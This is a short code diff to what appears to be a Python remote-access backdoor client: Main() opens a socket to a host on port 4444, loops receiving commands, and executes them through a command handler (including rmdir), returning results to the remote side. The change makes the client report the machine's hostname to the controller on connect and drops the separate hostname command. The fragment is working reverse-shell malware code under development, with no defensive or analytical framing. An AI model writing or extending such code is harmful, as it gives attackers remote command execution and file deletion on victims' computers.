@@ -170,6 +170,7 @@ def Main():
 	port = 4444
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((host, port))
+        s.send(str(socket.gethostname()))
 	FCMD = CMDA()
 	while True:
 		cmd = s.recv(1024)
@@ -246,9 +247,6 @@ def Main():
 		elif cmd[:5] == "rmdir":
 			result = FCMD.rmdir(cmd[6:])
 			s.send(result)
-
-		elif cmd == "hostname":
-			s.send(str(socket.gethostname()))
 
 		else:
 			s.send(" ")
